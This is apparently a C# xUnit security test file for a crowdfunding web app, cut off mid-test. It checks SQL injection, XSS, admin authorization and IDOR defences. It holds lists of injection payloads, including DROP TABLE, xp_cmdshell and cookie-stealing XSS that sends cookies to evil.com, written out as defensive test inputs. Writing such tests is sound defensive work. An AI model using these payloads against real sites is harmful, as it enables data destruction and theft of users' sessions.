using KryskataFund.Controllers;
using KryskataFund.Data;
using KryskataFund.Models;
using KryskataFund.Tests.Helpers;
using FluentAssertions;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using Moq;

namespace KryskataFund.Tests.Security
{
    /// <summary>
    /// Comprehensive security and penetration tests covering SQL Injection, XSS,
    /// Authorization/IDOR, and Input Validation attack vectors.
    /// Validates that the application properly handles malicious inputs without
    /// data leakage, crashes, or unauthorized access.
    /// </summary>
    public class SecurityTests
    {
        // =====================================================================
        // Common SQL injection payloads used across multiple tests
        // =====================================================================
        private static readonly string[] SqlInjectionPayloads = new[]
        {
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE Users; --",
            "'; DROP TABLE Funds; --",
            "1; DELETE FROM Users WHERE 1=1; --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' UNION SELECT Id, Email, PasswordHash FROM Users --",
            "' UNION SELECT 1, @@version, 3 --",
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "' AND SUBSTRING(@@version,1,1)='M' --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "'; WAITFOR DELAY '0:0:5'; --",
            "admin'--",
            "' OR 1=1#",
            "' OR ''='",
            "1' ORDER BY 1 --",
            "1' HAVING 1=1 --",
            "' AND (SELECT COUNT(*) FROM Users) > 0 --"
        };

        // =====================================================================
        // Common XSS payloads used across multiple tests
        // =====================================================================
        private static readonly string[] XssPayloads = new[]
        {
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert('xss')>",
            "\"><script>alert(document.cookie)</script>",
            "'-alert(1)-'",
            "<iframe src='javascript:alert(1)'>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<a href=\"javascript:alert(1)\">click</a>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">",
            "<script>new Image().src='https://evil.com/steal?cookie='+document.cookie</script>"
        };

        // =====================================================================
        // Helper methods for creating controllers with proper dependencies
        // =====================================================================

        private static SearchController CreateSearchController(ApplicationDbContext context)
        {
            var controller = new SearchController(context);
            TestHelper.SetupSession(controller);
            return controller;
        }

        private static AccountController CreateAccountController(ApplicationDbContext context)
        {
            var controller = new AccountController(context);
            TestHelper.SetupSession(controller);
            return controller;
        }

        private static AdminController CreateAdminController(ApplicationDbContext context, int? userId = null, bool isAdmin = false)
        {
            var controller = new AdminController(context);
            TestHelper.SetupSession(controller, userId: userId, isAdmin: isAdmin);
            return controller;
        }

        private static FundsController CreateFundsController(ApplicationDbContext context, int? userId = null, string? email = null)
        {
            var mockEnv = new Mock<IWebHostEnvironment>();
            mockEnv.Setup(e => e.WebRootPath).Returns("/tmp/wwwroot");

            var mockConfig = new Mock<IConfiguration>();
            mockConfig.Setup(c => c["Stripe:PublishableKey"]).Returns("pk_test_fake");

            var controller = new FundsController(context, mockEnv.Object, mockConfig.Object);
            TestHelper.SetupSession(controller, userId: userId, email: email);
            return controller;
        }

        private static HomeController CreateHomeController(ApplicationDbContext context, int? userId = null)
        {
            var mockLogger = new Mock<ILogger<HomeController>>();
            var controller = new HomeController(mockLogger.Object, context);
            TestHelper.SetupSession(controller, userId: userId);
            return controller;
        }

        // #####################################################################
        //  SECTION 1: SQL INJECTION TESTS
        // #####################################################################

        #region SQL Injection - Search Controller

        [Fact]
        public void Search_SqlInjection_ClassicOrPayload_DoesNotReturnAllRecords()
        {
            // Attack vector: Classic OR-based SQL injection in search query
            // Attempts to bypass WHERE clause by making condition always true
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Index("' OR '1'='1") as ViewResult;

            // Assert - LINQ parameterization prevents injection; should return 0 results
            result.Should().NotBeNull();
            var results = result!.ViewData["Results"] as List<Fund>;
            results.Should().NotBeNull();
            results!.Count.Should().BeLessThan(3,
                "SQL injection should not bypass the search filter and return all records");
        }

        [Fact]
        public void Search_SqlInjection_UnionSelect_DoesNotLeakUserData()
        {
            // Attack vector: UNION-based injection to extract data from Users table
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Index("' UNION SELECT Id, Email, PasswordHash FROM Users --") as ViewResult;

            // Assert - should not crash and should not return user data
            result.Should().NotBeNull();
            var results = result!.ViewData["Results"] as List<Fund>;
            results.Should().NotBeNull();
            // Results should only contain Fund objects, not leaked user data
            foreach (var fund in results!)
            {
                fund.Should().BeOfType<Fund>();
                fund.Title.Should().NotContain("PasswordHash");
                fund.Description.Should().NotContain("PasswordHash");
            }
        }

        [Fact]
        public void Search_SqlInjection_DropTable_DoesNotDestroyData()
        {
            // Attack vector: Destructive DROP TABLE injection
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Index("'; DROP TABLE Users; --") as ViewResult;

            // Assert - data should still exist after the attack attempt
            result.Should().NotBeNull();
            context.Users.Count().Should().Be(3, "DROP TABLE injection must not destroy data");
            context.Funds.Count().Should().Be(3, "DROP TABLE injection must not destroy data");
        }

        [Fact]
        public void Search_SqlInjection_CommentBased_DoesNotBypassFilter()
        {
            // Attack vector: Comment-based injection to terminate the rest of the query
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Index("Test' /*") as ViewResult;

            // Assert
            result.Should().NotBeNull();
            var results = result!.ViewData["Results"] as List<Fund>;
            results.Should().NotBeNull();
            // Should NOT return unfiltered results
            results!.Count.Should().BeLessThanOrEqualTo(3);
        }

        [Fact]
        public void Search_SqlInjection_BooleanBlind_DoesNotRevealDatabaseStructure()
        {
            // Attack vector: Boolean-based blind SQL injection
            // Attacker sends true/false conditions to infer database structure
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act - true condition
            var resultTrue = controller.Index("1' AND 1=1 --") as ViewResult;
            var resultsTrue = resultTrue!.ViewData["Results"] as List<Fund>;

            // Act - false condition
            var resultFalse = controller.Index("1' AND 1=2 --") as ViewResult;
            var resultsFalse = resultFalse!.ViewData["Results"] as List<Fund>;

            // Assert - both should return 0 results since the literal string doesn't match fund data
            resultsTrue!.Count.Should().Be(0);
            resultsFalse!.Count.Should().Be(0);
        }

        [Theory]
        [InlineData("' OR '1'='1")]
        [InlineData("' UNION SELECT NULL --")]
        [InlineData("'; EXEC xp_cmdshell('whoami'); --")]
        [InlineData("' AND SUBSTRING(@@version,1,1)='M' --")]
        public void Search_Autocomplete_SqlInjection_DoesNotCrashOrLeakData(string payload)
        {
            // Attack vector: SQL injection via the autocomplete endpoint
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act - should not throw
            var result = controller.Autocomplete(payload);

            // Assert
            result.Should().NotBeNull();
            result.Should().BeOfType<JsonResult>();
        }

        [Fact]
        public void Search_AllSqlPayloads_NoneReturnAllFunds()
        {
            // Attack vector: Comprehensive test of all SQL injection payloads
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            foreach (var payload in SqlInjectionPayloads)
            {
                // Act
                var result = controller.Index(payload) as ViewResult;

                // Assert - no payload should return all 3 seeded funds
                result.Should().NotBeNull($"Payload '{payload}' should not cause a null result");
                var results = result!.ViewData["Results"] as List<Fund>;
                results.Should().NotBeNull();
                // The payloads are garbage text that shouldn't match fund titles/descriptions
                results!.Count.Should().Be(0,
                    $"SQL injection payload '{payload}' should not match any fund data via LINQ");
            }
        }

        #endregion

        #region SQL Injection - Account Controller

        [Theory]
        [InlineData("' OR '1'='1' --")]
        [InlineData("admin'--")]
        [InlineData("' OR 1=1#")]
        [InlineData("' UNION SELECT 1,'admin@test.com','hash' --")]
        public void SignIn_SqlInjection_InEmail_DoesNotBypassAuthentication(string maliciousEmail)
        {
            // Attack vector: SQL injection in the login email field
            // Attempts to bypass authentication by injecting into the WHERE clause
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            // Act
            var result = controller.SignIn(maliciousEmail, "Password1");

            // Assert - should not authenticate; should return view with error
            result.Should().BeOfType<ViewResult>();
            var viewResult = result as ViewResult;
            viewResult!.ViewData["Error"].Should().Be("Invalid email or password");
        }

        [Theory]
        [InlineData("' OR '1'='1")]
        [InlineData("'; DROP TABLE Users; --")]
        public void SignIn_SqlInjection_InPassword_DoesNotBypassAuthentication(string maliciousPassword)
        {
            // Attack vector: SQL injection in the password field
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            // Act
            var result = controller.SignIn("creator@test.com", maliciousPassword);

            // Assert - password is hashed before comparison, so injection is meaningless
            result.Should().BeOfType<ViewResult>();
            var viewResult = result as ViewResult;
            viewResult!.ViewData["Error"].Should().Be("Invalid email or password");
        }

        [Fact]
        public void SignUp_SqlInjection_InEmail_DoesNotCorruptDatabase()
        {
            // Attack vector: SQL injection in the sign-up email field
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            var model = new SignUpViewModel
            {
                Email = "'; DROP TABLE Users; --@test.com",
                Password = "ValidPass1",
                ConfirmPassword = "ValidPass1"
            };

            // Act
            var result = controller.SignUp(model);

            // Assert - database should be intact
            context.Users.Count().Should().BeGreaterOrEqualTo(3,
                "SQL injection in sign-up must not destroy existing user data");
        }

        [Fact]
        public void SignUp_SqlInjection_InPassword_DoesNotCorruptDatabase()
        {
            // Attack vector: SQL injection in the password field during registration
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            var model = new SignUpViewModel
            {
                Email = "newuser@test.com",
                Password = "'; DELETE FROM Users; --Aa1",
                ConfirmPassword = "'; DELETE FROM Users; --Aa1"
            };

            // Act
            var result = controller.SignUp(model);

            // Assert - password is hashed, so injection payload becomes harmless hash input
            context.Users.Count().Should().BeGreaterOrEqualTo(3,
                "SQL injection in password must not delete data (password is hashed)");
        }

        #endregion

        #region SQL Injection - Fund Operations

        [Fact]
        public async Task FundCreation_SqlInjection_InTitle_DoesNotCorruptDatabase()
        {
            // Attack vector: SQL injection in fund title during creation
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var model = new CreateFundViewModel
            {
                Title = "'; DROP TABLE Funds; --",
                Description = "A normal description that is at least fifty characters long for validation purposes.",
                Category = "Education",
                GoalAmount = 1000,
                DurationDays = 30,
                ImageUrl = "https://example.com/image.jpg"
            };

            // Act
            var result = await controller.Create(model);

            // Assert - funds table should still exist and have data
            context.Funds.Count().Should().BeGreaterOrEqualTo(3,
                "SQL injection in fund title must not drop the Funds table");
        }

        [Fact]
        public async Task FundCreation_SqlInjection_InDescription_IsStoredAsLiteralText()
        {
            // Attack vector: SQL injection payload stored in fund description
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var sqlPayload = "' UNION SELECT Id, Email, PasswordHash FROM Users -- This description is long enough to meet the minimum fifty character requirement for validation";
            var model = new CreateFundViewModel
            {
                Title = "Normal Fund Title",
                Description = sqlPayload,
                Category = "Education",
                GoalAmount = 1000,
                DurationDays = 30,
                ImageUrl = "https://example.com/image.jpg"
            };

            // Act
            var result = await controller.Create(model);

            // Assert - the payload should be stored as literal text, not executed
            var createdFund = context.Funds.FirstOrDefault(f => f.Title == "Normal Fund Title");
            createdFund.Should().NotBeNull();
            createdFund!.Description.Should().Contain("UNION SELECT",
                "The SQL payload should be stored as literal text via parameterized query");
        }

        [Fact]
        public async Task ProcessDonation_SqlInjection_InAmount_DoesNotCorruptData()
        {
            // Attack vector: Attempting SQL injection via numeric donation amount
            // Decimal parsing protects against string-based injection
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            var originalRaised = context.Funds.First(f => f.Id == 1).RaisedAmount;

            // Act - pass a valid decimal but through the method that uses parameterized queries
            var result = await controller.ProcessDonation(1, 50m);

            // Assert
            var jsonResult = result as JsonResult;
            jsonResult.Should().NotBeNull();
            var fund = context.Funds.First(f => f.Id == 1);
            fund.RaisedAmount.Should().Be(originalRaised + 50m);
        }

        [Fact]
        public async Task AddCollaborator_SqlInjection_InEmail_DoesNotLeakData()
        {
            // Attack vector: SQL injection in the collaborator email search field
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act - inject SQL via the email parameter
            var result = await controller.AddCollaborator(1, "' OR '1'='1' --");

            // Assert - should return "not found" since no user has that email
            var jsonResult = result as JsonResult;
            jsonResult.Should().NotBeNull();
            var value = jsonResult!.Value;
            // The LINQ query uses == comparison, so the injection is treated as a literal string
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        #endregion

        #region SQL Injection - Admin Controller

        [Theory]
        [InlineData("' OR '1'='1' --")]
        [InlineData("'; DROP TABLE Funds; --")]
        public void AdminEditFund_SqlInjection_InTitle_StoredAsLiteral(string payload)
        {
            // Attack vector: SQL injection via admin fund edit title field
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 3, isAdmin: true);

            // Act
            var result = controller.EditFund(1, payload, "Normal description", 1000m);

            // Assert
            var fund = context.Funds.First(f => f.Id == 1);
            fund.Title.Should().Be(payload, "The SQL payload should be stored as literal text");
            context.Funds.Count().Should().Be(3, "No tables should be dropped");
        }

        #endregion

        // #####################################################################
        //  SECTION 2: XSS (CROSS-SITE SCRIPTING) TESTS
        // #####################################################################

        #region XSS - Fund Title and Description (Stored XSS)

        [Theory]
        [InlineData("<script>alert('xss')</script>")]
        [InlineData("<img src=x onerror=alert(1)>")]
        [InlineData("<svg onload=alert(1)>")]
        [InlineData("<body onload=alert('xss')>")]
        [InlineData("\"><script>alert(document.cookie)</script>")]
        public async Task FundCreation_XssInTitle_StoredWithoutExecution(string xssPayload)
        {
            // Attack vector: Stored XSS via fund title
            // The payload gets saved to DB; Razor view engine should auto-encode on render
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var model = new CreateFundViewModel
            {
                Title = xssPayload.Length <= 200 ? xssPayload : xssPayload[..200],
                Description = "A perfectly normal description that is long enough to meet the fifty character minimum validation requirement.",
                Category = "Education",
                GoalAmount = 1000,
                DurationDays = 30,
                ImageUrl = "https://example.com/image.jpg"
            };

            // Act
            var result = await controller.Create(model);

            // Assert - the fund should be created with the literal XSS text
            // Razor's @Model.Title auto-encodes HTML, preventing script execution
            var fund = context.Funds.FirstOrDefault(f => f.CreatorId == 1 && f.Description.Contains("perfectly normal"));
            fund.Should().NotBeNull("fund should be created despite XSS payload in title");
            // The raw value is stored; encoding happens at the view layer
            fund!.Title.Should().Contain(xssPayload.Length <= 200 ? xssPayload : xssPayload[..200]);
        }

        [Theory]
        [InlineData("<script>document.location='https://evil.com/steal?c='+document.cookie</script>")]
        [InlineData("<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">")]
        public async Task FundCreation_XssInDescription_StoredWithoutExecution(string xssPayload)
        {
            // Attack vector: Stored XSS via fund description - cookie stealing payloads
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            var description = xssPayload + " This description is long enough to meet the fifty character minimum validation requirement for funds.";
            var model = new CreateFundViewModel
            {
                Title = "Normal Title",
                Description = description,
                Category = "Education",
                GoalAmount = 1000,
                DurationDays = 30,
                ImageUrl = "https://example.com/image.jpg"
            };

            // Act
            var result = await controller.Create(model);

            // Assert - fund created, payload stored as literal text
            var fund = context.Funds.FirstOrDefault(f => f.Title == "Normal Title");
            fund.Should().NotBeNull();
            fund!.Description.Should().Contain(xssPayload);
            // No crash, no exception - Razor auto-encoding handles display safety
        }

        [Fact]
        public async Task StoredXss_FundTitleRenderedInDetails_NoScriptExecution()
        {
            // Attack vector: Stored XSS - malicious title saved, then rendered in Details view
            var context = TestHelper.CreateDbContext();
            var xssTitle = "<script>alert('xss')</script>";

            context.Users.Add(new User { Id = 10, Email = "xss@test.com", PasswordHash = TestHelper.HashPassword("Pass1234") });
            context.Funds.Add(new Fund
            {
                Id = 10,
                Title = xssTitle,
                Description = "Normal description",
                Category = "Education",
                GoalAmount = 1000,
                CreatorId = 10,
                CreatorName = "@xss",
                EndDate = DateTime.UtcNow.AddDays(30),
                CategoryColor = "#4ade80"
            });
            context.SaveChanges();

            var controller = CreateFundsController(context, userId: 10, email: "xss@test.com");

            // Act - view the fund details page
            var result = controller.Details(10) as ViewResult;

            // Assert
            result.Should().NotBeNull();
            var fundModel = result!.Model as Fund;
            fundModel.Should().NotBeNull();
            fundModel!.Title.Should().Be(xssTitle,
                "Raw XSS is stored in DB; Razor's @Model.Title provides HTML-encoding at render time");
        }

        #endregion

        #region XSS - Search Queries (Reflected XSS)

        [Theory]
        [InlineData("<script>alert('xss')</script>")]
        [InlineData("<img src=x onerror=alert(1)>")]
        [InlineData("<iframe src='javascript:alert(1)'>")]
        [InlineData("<input onfocus=alert(1) autofocus>")]
        public void Search_XssInQuery_DoesNotCrashAndStoresPayloadInViewBag(string xssPayload)
        {
            // Attack vector: Reflected XSS via search query parameter
            // The query is echoed back in ViewBag.Query; Razor auto-encodes it
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Index(xssPayload) as ViewResult;

            // Assert
            result.Should().NotBeNull();
            ((string)result!.ViewData["Query"]!).Should().Be(xssPayload,
                "ViewBag.Query stores the raw value; Razor auto-encodes on render");
            var results = result.ViewData["Results"] as List<Fund>;
            results.Should().NotBeNull();
        }

        [Theory]
        [InlineData("<script>alert(1)</script>")]
        [InlineData("<svg/onload=alert(1)>")]
        public void Search_Autocomplete_XssInTerm_ReturnsJsonSafely(string xssPayload)
        {
            // Attack vector: XSS via autocomplete search term
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateSearchController(context);

            // Act
            var result = controller.Autocomplete(xssPayload);

            // Assert - JSON serialization auto-escapes HTML entities
            result.Should().BeOfType<JsonResult>();
        }

        #endregion

        #region XSS - User Email (Sign-Up Stored XSS)

        [Theory]
        [InlineData("<script>alert(1)</script>@evil.com")]
        [InlineData("user+<img src=x onerror=alert(1)>@evil.com")]
        public void SignUp_XssInEmail_DoesNotExecute(string xssEmail)
        {
            // Attack vector: XSS payload embedded in email during registration
            // Email is displayed in profiles, fund creator names, etc.
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAccountController(context);

            var model = new SignUpViewModel
            {
                Email = xssEmail,
                Password = "ValidPass1",
                ConfirmPassword = "ValidPass1"
            };

            // Act - the model validation (EmailAddress) should reject most of these
            var result = controller.SignUp(model);

            // Assert - the controller should handle it (either reject invalid email or store it safely)
            result.Should().NotBeNull();
            // Even if stored, Razor auto-encodes the email in views
        }

        #endregion

        #region XSS - Fund Updates (Stored XSS)

        [Theory]
        [InlineData("<script>alert('update-xss')</script>")]
        [InlineData("<img src=x onerror=alert('update')>")]
        [InlineData("<details open ontoggle=alert(1)>")]
        public async Task PostUpdate_XssInTitle_StoredAsLiteralText(string xssPayload)
        {
            // Attack vector: Stored XSS via fund update title
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.PostUpdate(1, xssPayload, "Normal update content");

            // Assert
            var jsonResult = result as JsonResult;
            jsonResult.Should().NotBeNull();
            var update = context.FundUpdates.FirstOrDefault(u => u.FundId == 1);
            update.Should().NotBeNull();
            update!.Title.Should().Be(xssPayload,
                "XSS payload stored as literal text; Razor auto-encodes on output");
        }

        [Theory]
        [InlineData("<script>fetch('https://evil.com/'+document.cookie)</script>")]
        [InlineData("<marquee onstart=alert(1)>Hacked</marquee>")]
        public async Task PostUpdate_XssInContent_StoredAsLiteralText(string xssPayload)
        {
            // Attack vector: Stored XSS via fund update content body
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.PostUpdate(1, "Normal Title", xssPayload);

            // Assert
            var update = context.FundUpdates.FirstOrDefault(u => u.FundId == 1);
            update.Should().NotBeNull();
            update!.Content.Should().Be(xssPayload);
        }

        #endregion

        #region XSS - Milestones (Stored XSS)

        [Theory]
        [InlineData("<script>alert('milestone')</script>")]
        [InlineData("<img src=x onerror=alert(1)>")]
        public async Task AddMilestone_XssInTitle_StoredAsLiteralText(string xssPayload)
        {
            // Attack vector: Stored XSS via milestone title
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.AddMilestone(1, xssPayload, 500m, "Normal description");

            // Assert
            var jsonResult = result as JsonResult;
            jsonResult.Should().NotBeNull();
            var milestone = context.FundMilestones.FirstOrDefault(m => m.FundId == 1);
            milestone.Should().NotBeNull();
            milestone!.Title.Should().Be(xssPayload);
        }

        #endregion

        #region XSS - Collaborators

        [Fact]
        public async Task AddCollaborator_XssInEmail_DoesNotCrash()
        {
            // Attack vector: XSS payload as collaborator email search
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 1, email: "creator@test.com");

            // Act
            var result = await controller.AddCollaborator(1, "<script>alert(1)</script>");

            // Assert - should return user not found (no crash)
            var jsonResult = result as JsonResult;
            jsonResult.Should().NotBeNull();
            var value = jsonResult!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        #endregion

        #region XSS - Admin Fund Edit

        [Fact]
        public void AdminEditFund_XssInTitleAndDescription_StoredAsLiteral()
        {
            // Attack vector: Admin editing a fund with XSS payloads
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 3, isAdmin: true);

            var xssTitle = "<script>alert('admin-xss')</script>";
            var xssDesc = "<img src=x onerror=alert('admin-desc')>";

            // Act
            var result = controller.EditFund(1, xssTitle, xssDesc, 1000m);

            // Assert
            var fund = context.Funds.First(f => f.Id == 1);
            fund.Title.Should().Be(xssTitle);
            fund.Description.Should().Be(xssDesc);
        }

        #endregion

        // #####################################################################
        //  SECTION 3: AUTHORIZATION & IDOR TESTS
        // #####################################################################

        #region Authorization - Admin Endpoints

        [Fact]
        public void AdminDashboard_WithoutAdminSession_RedirectsToHome()
        {
            // Attack vector: Accessing admin dashboard without admin privileges
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.Dashboard();

            // Assert
            result.Should().BeOfType<RedirectToActionResult>();
            var redirect = result as RedirectToActionResult;
            redirect!.ActionName.Should().Be("Index");
            redirect.ControllerName.Should().Be("Home");
        }

        [Fact]
        public void AdminDeleteUser_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to delete users
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.DeleteUser(2) as JsonResult;

            // Assert
            result.Should().NotBeNull();
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            value.GetType().GetProperty("message")!.GetValue(value).Should().Be("Unauthorized");
        }

        [Fact]
        public void AdminToggleAdmin_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to grant admin privileges
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.ToggleAdmin(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public void AdminDeleteFund_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to delete funds via admin endpoint
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.DeleteFund(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            context.Funds.Count().Should().Be(3, "Fund should not be deleted by non-admin");
        }

        [Fact]
        public void AdminDeleteDonation_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to delete/refund donations
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.DeleteDonation(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public void AdminEditFund_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to edit funds via admin endpoint
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.EditFund(1, "Hacked Title", "Hacked Description", 999999m) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            var fund = context.Funds.First(f => f.Id == 1);
            fund.Title.Should().NotBe("Hacked Title", "Non-admin should not be able to edit funds");
        }

        [Fact]
        public void AdminAddFundsToFund_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to add funds (inflate raised amount)
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            var originalAmount = context.Funds.First(f => f.Id == 1).RaisedAmount;

            // Act
            var result = controller.AddFundsToFund(1, 1000000m) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            context.Funds.First(f => f.Id == 1).RaisedAmount.Should().Be(originalAmount);
        }

        [Fact]
        public void AdminToggleVerified_WithoutAdminSession_ReturnsUnauthorized()
        {
            // Attack vector: Non-admin attempting to verify/unverify funds
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.ToggleVerified(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public void AdminGetStats_WithoutAdminSession_ReturnsFailure()
        {
            // Attack vector: Non-admin attempting to access platform statistics
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateAdminController(context, userId: 1, isAdmin: false);

            // Act
            var result = controller.GetStats() as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
        }

        [Fact]
        public void AdminDashboard_UnauthenticatedUser_RedirectsToHome()
        {
            // Attack vector: Completely unauthenticated access to admin dashboard
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = new AdminController(context);
            TestHelper.SetupSession(controller); // No userId = not signed in

            // Act
            var result = controller.Dashboard();

            // Assert
            result.Should().BeOfType<RedirectToActionResult>();
        }

        #endregion

        #region IDOR - Insecure Direct Object Reference

        [Fact]
        public async Task IDOR_UserCannotDeleteAnotherUsersMilestone()
        {
            // Attack vector: IDOR - User 2 tries to delete a milestone belonging to User 1's fund
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);

            // Create a milestone for fund 1 (owned by user 1)
            context.FundMilestones.Add(new FundMilestone
            {
                Id = 1,
                FundId = 1,
                Title = "First Milestone",
                TargetAmount = 500,
                CreatedAt = DateTime.UtcNow
            });
            context.SaveChanges();

            // User 2 tries to delete it
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act
            var result = await controller.DeleteMilestone(1) as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            context.FundMilestones.Count().Should().Be(1, "Milestone should not be deleted by non-owner");
        }

        [Fact]
        public async Task IDOR_UserCannotPostUpdateToAnotherUsersFund()
        {
            // Attack vector: IDOR - User 2 tries to post an update to User 1's fund
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
            var controller = CreateFundsController(context, userId: 2, email: "donor@test.com");

            // Act - User 2 tries to post update to fund 1 (owned by user 1)
            var result = await controller.PostUpdate(1, "Hacked Update", "This fund is hacked!") as JsonResult;

            // Assert
            var value = result!.Value;
            value!.GetType().GetProperty("success")!.GetValue(value).Should().Be(false);
            context.FundUpdates.Count().Should().Be(0, "Non-creator should not post updates");
        }

        [Fact]
        public async Task IDOR_UserCannotAddCollaboratorToAnotherUsersFund()
        {
            // Attack vector: IDOR - User 2 tries to add collaborators to User 1's fund
            var context = TestHelper.CreateDbContext();
            TestHelper.SeedTestData(context);
